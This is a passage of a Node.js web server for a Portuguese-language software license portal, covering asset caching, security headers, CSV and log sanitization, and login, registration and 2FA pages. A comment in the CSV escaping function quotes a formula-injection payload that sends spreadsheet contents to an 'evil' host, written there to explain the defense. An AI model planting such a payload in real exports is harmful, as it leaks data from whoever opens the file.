    sha256: '64213392bec3c85c01e4688e83b30f32d8e808d168e97d88a026d4d4487a5e83',
    compressible: true,
  }),
  '/assets/zvm-client-dashboard.490813914538.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-client-dashboard.490813914538.js'),
    sha256: '490813914538be2d45e08ff7ec5d8ed873fece4249a58aafb7c1d18424a1aadc',
    compressible: true,
  }),
  '/assets/zvm-client-copy-intent.632eafe6c467.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-client-copy-intent.632eafe6c467.js'),
    sha256: '632eafe6c467d991012c11a120b6b5b851ddcf21517f09d31884638d01bf32d4',
    compressible: true,
  }),

  '/assets/zvm-i18n-public.5c4469481130.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-i18n-public.5c4469481130.css'),
    sha256: '5c446948113081593875079823532b55a12fc8ae61ec9af53b39b0d15781b336',
    compressible: true,
  }),
  '/assets/zvm-status.be29b1782339.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-status.be29b1782339.css'),
    sha256: 'be29b1782339b124f7bf79d22eff4e0b848545b3f7020829a29d29e6d5b18d28',
    compressible: true,
  }),
});

function sendPublicAsset(req, res, pathname) {
  const spec = _PUBLIC_ASSETS[pathname];
  if (!spec || (req.method !== 'GET' && req.method !== 'HEAD')) return false;
  let body;
  try { body = fs.readFileSync(spec.file); }
  catch (_) {
    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'no-store', ..._SEC_HEADERS });
    res.end('Not found');
    return true;
  }
  const etag = '"sha256-' + spec.sha256.slice(0, 24) + '"';
  const headers = {
    'Content-Type': spec.type,
    'Content-Length': body.length,
    'Cache-Control': 'public, max-age=31536000, immutable',
    'ETag': etag,
    ..._SEC_HEADERS,
  };
  Object.entries(headers).forEach(([key, value]) => res.setHeader(key, value));
  if (spec.compressible === true) _appendVary(res, 'Accept-Encoding');
  if (String(req.headers['if-none-match'] || '').trim() === etag) {
    res.removeHeader('Content-Length');
    res.writeHead(304);
    res.end();
    return true;
  }
  if (req.method === 'HEAD') {
    res.writeHead(200);
    res.end();
    return true;
  }
  if (spec.compressible === true && body.length > 1024) {
    res.removeHeader('Content-Length');
    _compressedSend(res, body, 200, String(req.headers['accept-encoding'] || ''));
    return true;
  }
  res.writeHead(200);
  res.end(body);
  return true;
}

function _appendVary(res, token) {
  const current = String(res.getHeader('Vary') || '').split(',').map(v => v.trim()).filter(Boolean);
  if (!current.some(v => v.toLowerCase() === String(token).toLowerCase())) current.push(token);
  if (current.length) res.setHeader('Vary', current.join(', '));
}

function _htmlEtag(buf) {
  // Conteudo-especifico: se a nav mudar apos login/logout o ETag muda junto.
  return '"zvm-' + crypto.createHash('sha256').update(buf).digest('base64url').slice(0, 22) + '"';
}

function sendJson(res, data, status = 200) {
  const body = JSON.stringify(data);
  const buf  = Buffer.from(body, 'utf8');
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  Object.entries(_SEC_HEADERS).forEach(([k,v]) => res.setHeader(k, v));
  const accept = String(res.req?.headers?.['accept-encoding'] || '');
  if (buf.length > 2048) {
    _appendVary(res, 'Accept-Encoding');
    _compressedSend(res, buf, status, accept);
    return;
  }
  res.writeHead(status);
  res.end(buf);
}

// Owner-approved identity is applied once, after each page's legacy sheets.
// Scope to document types that actually use this theme; preserve the independent
// sales homepage, API responses, assets, scripts, checkouts and Cloud application.
const ZVM_OWNER_SITE_THEME = '<link rel="stylesheet" href="/assets/zvm-owner-site.42d17a62234b.css">';
function applyOwnerSiteTheme(html) {
  if (typeof html !== 'string' || !html.includes('</head>') ||
      html.includes('/assets/zvm-owner-site.42d17a62234b.css')) return html;
  if (!/<body\b[^>]*class=["'][^"']*\bzvm-(?:public-premium|client-premium|auth-premium|admin-r6)\b/.test(html)) {
    return html;
  }
  return html.replace('</head>', ZVM_OWNER_SITE_THEME + '</head>');
}

function sendHtml(res, html, status = 200) {
  // Paginas sensiveis (portal/admin/analytics/erros de sessao) continuam NO-STORE.
  html = applyOwnerSiteTheme(html);
  const buf = Buffer.from(html, 'utf8');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('Connection', 'keep-alive');
  Object.entries(_SEC_HEADERS).forEach(([k,v]) => res.setHeader(k, v));
  const accept = String(res.req?.headers?.['accept-encoding'] || '');
  if (buf.length > 4096) {
    _appendVary(res, 'Accept-Encoding');
    _compressedSend(res, buf, status, accept);
    return;
  }
  res.writeHead(status);
  res.end(buf);
}

function sendAuthHtml(res, html, status = 200) {
  // Apenas telas de acesso do cliente: nenhum dashboard, Admin ou Analytics recebe
  // tradução de dados de usuário ou o seletor de idioma nesta rodada.
  const request = res.req || {};
  const requestUrl = new URL(String(request.url || '/'), 'https://zvm.invalid');
  const path = requestUrl.pathname;
  const portalAuth = html.includes('class="auth-shell') && (
    html.includes('action="/cliente/login"') ||
    html.includes('action="/cliente/registro"') ||
    html.includes('action="/cliente/recuperar"') ||
    html.includes('action="/cliente/redefinir"') ||
    ((path === '/cliente/recuperar' || path === '/cliente/redefinir') && html.includes('class="auth-form-card"'))
  );
  if (portalAuth) {
    const info = resolvePublicLocale(request);
    const formRoute = html.includes('action="/cliente/registro"') ? '/cliente/registro'
      : html.includes('action="/cliente/recuperar"') ? '/cliente/recuperar'
      : html.includes('action="/cliente/redefinir"') ? '/cliente/redefinir'
      : (path === '/cliente/recuperar' || path === '/cliente/redefinir') ? path : '/cliente';
    // A troca de idioma preserva apenas redirecionamentos locais explícitos.
    const redirect = requestUrl.searchParams.get('redir') ||
      (html.match(/<input type="hidden" name="redir" value="([^"]*)"/) || [])[1] || '';
    const safeRedirect = /^\/(?:[a-z0-9/_-]{0,100})$/i.test(redirect) ? redirect : '';
    const resetToken = formRoute === '/cliente/redefinir' ?
      (requestUrl.searchParams.get('token') || (html.match(/<input type="hidden" name="token" value="([^"]*)"/) || [])[1] || '') : '';
    const safeResetToken = /^[a-f0-9]{32,64}$/.test(resetToken) ? resetToken : '';
    const languagePath = formRoute + (safeResetToken ? '?token=' + safeResetToken : safeRedirect ? '?redir=' + encodeURIComponent(safeRedirect) : '');
    html = localizeAuthHtml(html, info.locale, { path: languagePath });
    res.setHeader('Content-Language', info.locale);
    _appendVary(res, 'Accept-Language');
    if (info.persist) {
      const secure = !!request.socket?.encrypted || String(request.headers?.['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase() === 'https';
      setLanguageCookie(res, info.locale, secure);
    }
  }
  // Auth/conta e Portal atual: sem script/style/handlers inline; CSP fechada em 'self'.
  html = applyOwnerSiteTheme(html);
  const buf = Buffer.from(html, 'utf8');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('Connection', 'keep-alive');
  Object.entries(_SEC_HEADERS).forEach(([k,v]) => res.setHeader(k, v));
  res.setHeader('Content-Security-Policy', _CSP_AUTH_STRICT);
  const accept = String(res.req?.headers?.['accept-encoding'] || '');
  if (buf.length > 1024) {
    _appendVary(res, 'Accept-Encoding');
    _compressedSend(res, buf, status, accept);
    return;
  }
  res.writeHead(status);
  res.end(buf);
}

function sendPublicHtml(res, html, status = 200) {
  const request = res.req || {};
  const currentPath = new URL(String(request.url || '/'), 'https://zvm.invalid').pathname;
  const localeInfo = resolvePublicLocale(request);
  if (currentPath === '/' && status === 200) {
    // Owner-provided campaign layout is authored in pt-BR; don't apply translations
    // belonging to the retired homepage (Planos, FAQ and legal remain localized).
    res.setHeader('Content-Language', 'pt-BR');
  } else if (['/planos', '/faq', '/privacidade', '/termos'].includes(currentPath) && status === 200) {
    html = localizePublicHtml(html, localeInfo.locale, { path: currentPath });
    res.setHeader('Content-Language', localeInfo.locale);
    _appendVary(res, 'Accept-Language');
    if (localeInfo.persist) {
      const secure = !!request.socket?.encrypted || String(request.headers?.['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase() === 'https';
      setLanguageCookie(res, localeInfo.locale, secure);
    }
  }
  // Publico, mas a nav pode variar conforme a sessao do portal. Por isso:
  // - private: nunca permite cache compartilhado/CDN servir pagina de outro usuario;
  // - no-cache: navegador pode guardar, mas precisa revalidar antes de reutilizar;
  // - ETag: resposta identica vira 304 sem retransmitir dezenas de KB de HTML.
  html = applyOwnerSiteTheme(html);
  const buf = Buffer.from(html, 'utf8');
  const etag = _htmlEtag(buf);
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'private, no-cache');
  res.setHeader('ETag', etag);
  res.setHeader('Connection', 'keep-alive');
  Object.entries(_SEC_HEADERS).forEach(([k,v]) => res.setHeader(k, v));
  res.setHeader('Content-Security-Policy', _CSP_PUBLIC_STRICT);
  _appendVary(res, 'Cookie');
  _appendVary(res, 'Accept-Encoding');

  if (status === 200 && String(res.req?.headers?.['if-none-match'] || '').trim() === etag) {
    res.statusCode = 304;
    res.end();
    return;
  }

  const accept = String(res.req?.headers?.['accept-encoding'] || '');
  if (buf.length > 1024) {
    _compressedSend(res, buf, status, accept);
    return;
  }
  res.writeHead(status);
  res.end(buf);
}

function escHtml(s) {
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;').replace(/`/g,'&#96;');
}

// Célula CSV segura. Além do escape de aspas, prefixa com apóstrofo qualquer valor
// iniciado por = + - @ TAB CR: Excel/LibreOffice/Sheets interpretam esses valores como
// FÓRMULA. Um label de chave ou clientName de webhook contendo
// =HYPERLINK("http://evil/?"&A1,"clique") exfiltra a planilha quando o admin abre o
// export (CSV injection / formula injection).
function csvCell(v) {
  let s = String(v == null ? '' : v)
    .replace(/[\r\n]+/g, ' ')
    .replace(/[\t\f\v]+/g, ' ');
  if (/^[\u0000-\u0020]*[=+\-@]/.test(s)) s = "'" + s;
  return '"' + s.replace(/"/g, '""') + '"';
}

const DEDUP_WINDOWS = {
  'relogin_ok':   24 * 60 * 60 * 1000,
  'expired':       5 * 60 * 1000,
  'login_blocked': 5 * 60 * 1000,
  'warn_limit':   10 * 60 * 1000,
};
const _dedupMap = new Map();

// Sanitiza campos de log vindos de fontes externas:
// remove chars de controle (newline, null, etc.) e aplica caps de tamanho
// para impedir log injection e corrompimento de registros estruturados.
function _sanitizeLogField(v, maxLen = 120) {
  return String(v || '').replace(/[\x00-\x1f\x7f]/g, ' ').trim().slice(0, maxLen);
}

async function addLog(entry) {
  const dedupMs = DEDUP_WINDOWS[entry.action];
  if (dedupMs) {
    const dedupKey = entry.action + ':' + (entry.keyCode||'') + ':' + (entry.phone||'');
    const lastTs = _dedupMap.get(dedupKey) || 0;
    if (Date.now() - lastTs < dedupMs) return;
    _dedupMap.set(dedupKey, Date.now());
  }
  // Spread primeiro, depois sobrescreve com valores higienizados
  logs.unshift({
    ...entry,
    keyCode:    _sanitizeLogField(entry.keyCode,    32),
    label:      _sanitizeLogField(entry.label,      80),
    phone:      _sanitizeLogField(entry.phone,      20),
    ip:         _sanitizeLogField(entry.ip,         45), // IPv6 max = 39 chars
    wppVersion: _sanitizeLogField(entry.wppVersion, 40),
    action:     _sanitizeLogField(entry.action,     30),
    timestamp:  new Date().toISOString(),
  });

  if (logs.length > LOG_MAX) logs = logs.slice(0, LOG_MAX);
  await saveLogs();
}

async function addAdminAuditLog({ actor = 'admin', action, keyCode = '', label = '', detail = '' }) {
  try {
    const db = await getMongoDb();
    await db.collection('admin_audit_logs').insertOne({
      ts: new Date(), actor: String(actor || 'admin').slice(0, 40),
      action: String(action || '').slice(0, 80), keyCode: String(keyCode || '').slice(0, 80),
      label: String(label || '').slice(0, 120), detail: String(detail || '').slice(0, 500),
    });
  } catch (e) { console.warn('[ADMIN-AUDIT]', e.message); }
}


// ──────────────── PORTAL DO CLIENTE ────────────────────────────
function renderPortalPage(body, title='ZVM — Minha Conta', extra='', headExtra='') {
  const fav = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23080808'/%3E%3Ctext x='50%25' y='54%25' dominant-baseline='middle' text-anchor='middle' font-family='monospace' font-weight='700' font-size='14' fill='%2300ff87'%3EZVM%3C/text%3E%3C/svg%3E";
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title}</title>
<link rel="icon" type="image/svg+xml" href="${fav}">
<link rel="stylesheet" href="/assets/zvm-r46-client-dashboard.64213392bec3.css"><link rel="stylesheet" href="/assets/zvm-action-hub.07aa17b87c3e.css">
${headExtra}
<link rel="stylesheet" href="/assets/zvm-r46-system.aa366d924866.css">
<link rel="stylesheet" href="/assets/zvm-console-design.44762cb103f8.css">
</head><body class="zvm-client-premium">
<a class="portal-skip" href="#main-content">Ir para o conteúdo</a>
<div class="page-wrap portal-page-wrap">
${extra}${body}
</div>
<footer class="portal-footer">© ${new Date().getFullYear()} ZVM · Todos os direitos reservados · <a href="/privacidade">Privacidade</a> · <a href="${ZVM_SUPPORT_URL}" target="_blank" rel="noopener">Suporte</a></footer>
<script src="/assets/zvm-client-dashboard.490813914538.js" defer></script>
<script src="/assets/zvm-client-copy-intent.632eafe6c467.js" defer></script>
${_SCRIPT_PWD_TOGGLE}
</body></html>`;
}

// ── /cliente (deslogado) e /cliente/registro — reescritos do zero como
// páginas standalone independentes (Parte 4/5 da rodada de polish visual).
// NÃO reaproveitam renderPortalLogin/renderPortalRegister/renderPortalPage
// Reaproveitam sim a mesma fundação visual de /planos, /faq, /privacidade
// (_sharedCss+_standaloneCss+_sharedNav+_standaloneFoot), pra ganhar nav
// consistente (incl. hamburger mobile já pronto) sem duplicar essa lógica.
// Contrato preservado: POST /cliente/login (campos email/pass, redir
// hidden), POST /cliente/registro (name/email/phone/keycode/pass/pass2,
// redir hidden), autocomplete, rate limit e mensagens de erro/sucesso são
// só passados como texto pra estas views - nenhuma validação de backend
// foi tocada.

function renderClientWorkspacePage({portalUser=null,active='overview',eyebrow='Minha ZVM',title='Conta',subtitle='',content='',aside=''}){
  const sideContent=aside||`<div class="client-app-mini"><span>Privacidade</span><strong>Seus dados, sob seu controle</strong><p>Algumas alterações exigem senha ou autenticação em duas etapas.</p></div><div class="client-app-mini"><span>Suporte</span><strong>Precisa de ajuda?</strong><p>Fale com a equipe ZVM pelo WhatsApp.</p></div>`;
  const body=`<div class="client-shell">${renderClientPortalRail(active)}<main id="main-content" class="client-main client-workspace-main" tabindex="-1">
    <div class="dash-topbar"><div class="dash-page-heading"><span>${escHtml(eyebrow)}</span><strong>${escHtml(title)}</strong></div><div class="dash-topbar-user">${renderClientAccountIdentity(portalUser)}<a class="dash-logout" href="/cliente/logout">Sair da conta</a></div></div>
    <section class="client-app-hero"><div><span class="client-app-kicker">${escHtml(eyebrow)}</span><h1>${escHtml(title)}</h1><p>${escHtml(subtitle)}</p></div><div class="client-app-hero-side"><div class="client-app-hero-note"><span>Acesso</span><strong>Sessão protegida</strong></div><div class="client-app-hero-note"><span>Ajuda</span><strong>Suporte disponível pelo WhatsApp</strong></div></div></section>
    <div class="client-app-grid"><section class="client-app-card">${content}</section><aside class="client-app-aside">${sideContent}</aside></div>
  </main></div>${_SCRIPT_AUTH_SUBMIT_LOCK}`;
  return renderPortalPage(body,`ZVM — ${escHtml(title)}`,'',`${_CSS_AUTH}${_CSS_CLIENT_WORKSPACE}`);
}
function renderPortalLicenseUnavailable(active='overview') {
  return renderClientWorkspacePage({
    active, eyebrow: 'Minha ZVM', title: 'Informações temporariamente indisponíveis',
    subtitle: 'Não foi possível confirmar os dados atuais da sua licença.',
    content: '<div role="alert" class="auth-form-hint">Sua conta continua conectada e nenhuma alteração foi feita na licença. Tente novamente em alguns instantes.</div><div class="auth-switch"><a href="/cliente">Atualizar a visão geral</a></div>',
  });
}
const AUTH_BENEFITS = [
  ['🔑', 'Acompanhe status, validade e contagem regressiva da sua chave em tempo real'],
  ['📱', 'Veja e gerencie os dispositivos vinculados à sua licença'],
  ['🛒', 'Renove ou troque de plano em poucos cliques'],
  ['⬇', 'Acesse a versão oficial da extensão e os materiais de orientação'],
];

function renderStandalonePortalLogin(err = '', redir = '', ok = '') {
  const safeRedirect = safeLocalRedirect(redir);
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const benefitsHtml = AUTH_BENEFITS.map(([icon, text]) => `<li><span class="auth-benefit-icon" aria-hidden="true">${icon}</span><span>${text}</span></li>`).join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Entrar</title><link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_SYSTEM}</head>
<body class="zvm-auth-immersive zvm-auth-premium">
<a class="skip-link" href="#main-content">Ir para o formulário</a>
<main id="main-content" class="auth-shell">
  <section class="auth-promo"><div class="auth-promo-inner">
    <div class="auth-eyebrow">Portal do Cliente</div>
    <h1>Gerencie sua ZVM <em>sem complicação.</em></h1>
    <p class="auth-promo-sub">Consulte sua licença, validade, dispositivos e renovações com uma conta protegida.</p>
    <ul class="auth-benefits">${benefitsHtml}</ul>
  </div></section>
  <section class="auth-form-wrap"><div class="auth-form-card">
    <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
    <h2>Entrar na sua conta</h2>
    <p class="auth-form-hint">Acesse sua conta para gerenciar sua licença e continuar de onde parou.</p>
    <div class="auth-secure-chip">Acesso protegido</div>
    ${errHtml}${okHtml}
    <form method="POST" action="/cliente/login">
      <input type="hidden" name="redir" value="${escHtml(safeRedirect)}">
      <div class="auth-field"><label for="auth-email">E-mail</label><input id="auth-email" type="email" name="email" placeholder="seu@email.com" required autocomplete="email"></div>
      <div class="auth-field"><label for="auth-pass">Senha</label><input id="auth-pass" type="password" name="pass" placeholder="Sua senha" required autocomplete="current-password"></div>
      <div class="auth-forgot"><a href="/cliente/recuperar">Esqueci minha senha</a></div>
      <button type="submit" class="auth-submit">Entrar<span class="auth-spinner" aria-hidden="true"></span></button>
    </form>
    <div class="auth-switch">Ainda não tem conta? <a href="/cliente/registro${safeRedirect ? '?redir=' + encodeURIComponent(safeRedirect) : ''}">Criar conta</a></div>
    <div class="auth-footnote">Sua senha é protegida e nunca é exibida no painel.</div>
  </div></section>
</main>
${_standaloneFoot()}${_SCRIPT_PWD_TOGGLE}${_SCRIPT_AUTH_SUBMIT_LOCK}
</body></html>`;
}

function renderStandalonePortalRegister(err = '', vals = {}, redir = '') {
  const safeRedirect = safeLocalRedirect(redir);
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const v = k => escHtml(vals[k] || '');
  const benefitsHtml = AUTH_BENEFITS.map(([icon, text]) => `<li><span class="auth-benefit-icon" aria-hidden="true">${icon}</span><span>${text}</span></li>`).join('');
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Criar Conta</title><link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_SYSTEM}</head>
<body class="zvm-auth-immersive zvm-auth-premium">
<a class="skip-link" href="#main-content">Ir para o formulário</a>
<main id="main-content" class="auth-shell auth-register">
  <section class="auth-promo"><div class="auth-promo-inner">
    <div class="auth-eyebrow">Nova conta ZVM</div>
    <h1>Crie sua conta <em>ZVM.</em></h1>
    <p class="auth-promo-sub">Use uma única conta para acompanhar sua licença, dispositivos, segurança e renovações.</p>
    <ul class="auth-benefits">${benefitsHtml}</ul>
  </div></section>
  <section class="auth-form-wrap"><div class="auth-form-card">
    <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
    <h2>Criar sua conta</h2>
    <p class="auth-form-hint">Crie seu acesso para gerenciar sua ZVM.</p>
    <div class="auth-secure-chip">Uma conta para sua ZVM</div>
    ${errHtml}
    <form method="POST" action="/cliente/registro">
      <input type="hidden" name="redir" value="${escHtml(safeRedirect)}">
      <div class="auth-field-row">
        <div class="auth-field"><label for="reg-name">Nome completo</label><input id="reg-name" type="text" name="name" placeholder="Seu nome" required value="${v('name')}" maxlength="80" autocomplete="name"></div>
        <div class="auth-field"><label for="reg-phone">WhatsApp</label><input id="reg-phone" type="tel" name="phone" placeholder="11999990000" value="${v('phone')}" maxlength="20" pattern="[0-9+\s()-]{8,20}" autocomplete="tel"></div>
      </div>
      <div class="auth-field"><label for="reg-email">E-mail</label><input id="reg-email" type="email" name="email" placeholder="seu@email.com" required value="${v('email')}" autocomplete="email"><div class="auth-field-hint">Use este mesmo e-mail na compra para vincular sua licença automaticamente.</div></div>
      <div class="auth-field"><label for="reg-keycode">Chave ZVM <span class="auth-label-optional">(opcional)</span></label><input id="reg-keycode" type="text" name="keycode" placeholder="zv-xxxxx-xxxxx-xxxxx" value="${v('keycode')}" maxlength="30"><div class="auth-field-hint">Se ainda não tiver uma chave, você pode vincular depois.</div></div>
      <div class="auth-field-row">
        <div class="auth-field"><label for="reg-pass">Senha</label><input id="reg-pass" type="password" name="pass" placeholder="Mínimo 8 caracteres" required minlength="8" autocomplete="new-password"></div>
        <div class="auth-field"><label for="reg-pass2">Confirmar senha</label><input id="reg-pass2" type="password" name="pass2" placeholder="Repita a senha" required minlength="8" autocomplete="new-password"></div>
      </div>
      <button type="submit" class="auth-submit">Criar conta<span class="auth-spinner" aria-hidden="true"></span></button>
    </form>
    <div class="auth-switch">Já tem conta? <a href="/cliente${safeRedirect ? '?redir=' + encodeURIComponent(safeRedirect) : ''}">Entrar</a></div>
    <div class="auth-footnote">Seu acesso pode ser usado no Portal do Cliente e na extensão.</div>
  </div></section>
</main>
${_standaloneFoot()}${_SCRIPT_PWD_TOGGLE}${_SCRIPT_AUTH_SUBMIT_LOCK}
</body></html>`;
}

// ── 2FA standalone — mesma família visual do login/cadastro (auth-shell).
// NÃO reaproveita renderPortal2FAVerify/renderPortalSetup2FA (essas
// Contrato
// preservado: mesmos endpoints, mesmos names de campo (code), mesma
// sessão/redir/TOTP/rate limit — só a view muda.
const SECURITY_BENEFITS = [
  ['🛡', 'Proteção extra contra acesso indevido à sua conta'],
  ['🔑', 'Uma camada além da sua senha, só sua'],
  ['⏱', 'Código temporário gerado pelo seu aplicativo autenticador'],
  ['🔒', 'Mais controle sobre quem acessa sua licença'],
];
function _securityPromo(eyebrow, title) {
  const benefitsHtml = SECURITY_BENEFITS.map(([icon, text]) => `<li><span class="auth-benefit-icon" aria-hidden="true">${icon}</span><span>${text}</span></li>`).join('');
  return `<div class="auth-promo">
    <div class="auth-promo-inner">
      <div class="auth-eyebrow">${eyebrow}</div>
      <h1>${title}</h1>
      <p class="auth-promo-sub">Um código extra do seu aplicativo autenticador impede acesso à sua conta mesmo que sua senha vaze.</p>
      <ul class="auth-benefits">${benefitsHtml}</ul>
    </div>
  </div>`;
}

// ── FAQ ZVM — fonte única compartilhada entre /faq e o mini-FAQ do
// dashboard (evita duas listas divergentes). Perguntas herdadas do
// Perguntas do produto legado (métricas antigas de uso, etc.) foram removidas; cada item
// abaixo corresponde a um recurso que o standalone realmente tem hoje.
const ZVM_FAQ_ITEMS = [
  ['Como recebo minha licença depois da compra?', 'Assim que o pagamento é aprovado, sua chave é gerada e enviada automaticamente por e-mail. Você também acompanha tudo pelo painel Minha Conta.'],
  ['Preciso criar uma conta antes de comprar?', 'Não. Quando as vendas estiverem abertas, você pode comprar diretamente na Cakto sem login ZVM. Informe um e-mail válido; depois do pagamento, a chave será enviada para ele. Crie ou acesse sua conta ZVM e vincule a chave pelo Portal do Cliente. Usar o mesmo e-mail ajuda na vinculação automática.'],
  ['Como instalar e acessar a ZVM?', 'Use sempre o link oficial disponibilizado pela ZVM, instale a extensão no navegador compatível e entre com sua conta. Se a licença ainda não estiver vinculada, faça a vinculação pelo Portal do Cliente.'],
  ['Quantos números posso usar?', 'Nos novos planos, START oferece 1 acesso e PRO oferece até 3. ENTERPRISE é sob consulta e não está disponível para compra automática. Contratos anteriores preservam seus limites.'],
  ['Como renovo minha licença?', ZVM_SALES_PAUSED ? 'As renovações estão temporariamente suspensas. Consulte os planos no Portal do Cliente; quando os pagamentos voltarem a ficar disponíveis, a renovação será feita pelo checkout da Cakto.' : 'No portal, acesse "Renovar / Alterar Plano" e conclua a compra pela Cakto — a renovação é aplicada automaticamente à sua chave.'],
  ['Posso alterar meu plano?', ZVM_SALES_PAUSED ? 'A troca de plano por compra está temporariamente suspensa. Você pode consultar as opções em Planos, mas não há checkout disponível enquanto as vendas estiverem pausadas.' : 'Sim. Escolha outro plano em Planos; a chave existente passa a usar o novo limite de dispositivos.'],
  ['Onde vejo a validade da minha licença?', 'No painel Minha Conta, nas seções "Minha licença" e "Resumo da conta".'],
  ['Como removo um dispositivo?', 'Em Minha Conta, na seção "Dispositivos cadastrados", clique em Remover ao lado do número.'],
  ['Como vincular uma chave que já tenho?', 'Em Minha Conta, acesse "Vincular chave" e informe o código recebido — ela passa a aparecer no seu painel.'],
  ['Minha chave expirou. O que faço?', ZVM_SALES_PAUSED ? 'Sua chave continua vinculada à sua conta, mas as renovações estão temporariamente suspensas. Consulte os planos e, se precisar de orientação sobre o acesso, fale com o suporte. Não tente repetir pagamentos sem checkout disponível.' : 'Entre no portal e clique em "Renovar agora" — a validade é atualizada assim que o pagamento é confirmado. Seus dispositivos vinculados continuam salvos e voltam a funcionar assim que a chave é renovada.'],
  ['Preciso usar o mesmo e-mail na compra?', ZVM_SALES_PAUSED ? 'Não. Quando as compras forem reabertas, você poderá comprar sem criar uma conta. Informe um e-mail válido para receber a chave; se já tiver conta ZVM, usar o mesmo e-mail facilita a associação. Caso contrário, vincule a chave no Portal do Cliente.' : 'Não. Você pode comprar sem criar uma conta. Informe um e-mail válido para receber a chave; se já tiver conta ZVM, usar o mesmo e-mail facilita a associação. Caso contrário, vincule a chave no Portal do Cliente.'],
  ['Como funciona o 2FA?', 'Ative em Segurança 2FA: adicione a chave de configuração no seu aplicativo autenticador e confirme com o código de 6 dígitos a cada login.'],
  ['Onde encontro a versão oficial?', 'Use o link oficial disponibilizado pela ZVM no site ou no Portal do Cliente. Evite instalar cópias de terceiros ou arquivos recebidos por fontes não verificadas.'],
  ['Minha compra foi aprovada mas a chave não apareceu.', 'Aguarde alguns minutos para o processamento automático. Se persistir, fale com o suporte.'],
  ['Esqueci minha senha. Como recupero?', 'Na tela de login, escolha "Esqueci minha senha". Se o e-mail estiver cadastrado, você receberá um link seguro de redefinição.'],
  ['Como falo com o suporte?', 'Pelo WhatsApp, através do botão de suporte disponível no rodapé e no painel.'],
];
// Busca um item pelo início da pergunta — usado só pra reagrupar o mesmo
// conteúdo em categorias visuais sem duplicar texto (fonte continua única).
function _faqPick(startsWith) {
  const item = ZVM_FAQ_ITEMS.find(([q]) => q.startsWith(startsWith));
  if (!item) throw new Error('_faqPick: pergunta não encontrada em ZVM_FAQ_ITEMS: ' + startsWith);
  return item;
}

function renderStandalone2FAVerify(err = '') {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  return `<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ZVM — Verificação em Duas Etapas</title><link rel="icon" type="image/svg+xml" href="${_FAV}">
${_CSS_SHARED}${_CSS_STANDALONE}${_CSS_AUTH}${_CSS_SYSTEM}</head>
<body class="zvm-auth-premium">${_sharedNav({ variant: 'auth' })}
<main id="main-content" class="auth-shell">
  ${_securityPromo('Portal do Cliente', 'Proteja sua conta <em>ZVM</em>')}
  <div class="auth-form-wrap">
    <div class="auth-form-card">
      <div class="auth-form-brand">${renderStandaloneBrand('auth')}</div>
      <h2>Verificação em duas etapas</h2>
      <p class="auth-form-hint">Abra seu aplicativo autenticador (Google Authenticator, Authy, etc.) e insira o código de 6 dígitos.</p>
      ${errHtml}
      <form method="POST" action="/cliente/2fa/verificar">
        <div class="auth-field"><label for="twofa-code">Código de autenticação</label><input id="twofa-code" type="text" name="code" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="000000" required autocomplete="one-time-code" class="auth-code-input"></div>
        <button type="submit" class="auth-submit">Verificar<span class="auth-spinner" aria-hidden="true"></span></button>
      </form>
      <div class="auth-switch"><a href="/cliente/logout">Cancelar e voltar ao login</a></div>
    </div>
  </div>
</main>
${_standaloneFoot()}
${_SCRIPT_AUTH_SUBMIT_LOCK}
</body></html>`;
}

function renderStandaloneSetup2FA(user, pendingSecret = '', err = '', ok = '') {
  const errHtml = err ? `<div class="auth-alert err" role="alert">⚠ ${escHtml(err)}</div>` : '';
  const okHtml = ok ? `<div class="auth-alert ok" role="status">✅ ${escHtml(ok)}</div>` : '';
  const has2fa = portalTotpHasSecret(user);
  let content;
  if (has2fa) {
    content = `
      <h2>Segurança — 2FA ativo</h2>
      <p class="auth-form-hint">Sua conta está protegida com autenticação em dois fatores. Para desativar, confirme com um código válido do seu aplicativo autenticador.</p>
      ${errHtml}${okHtml}
      <form method="POST" action="/cliente/2fa/desativar">
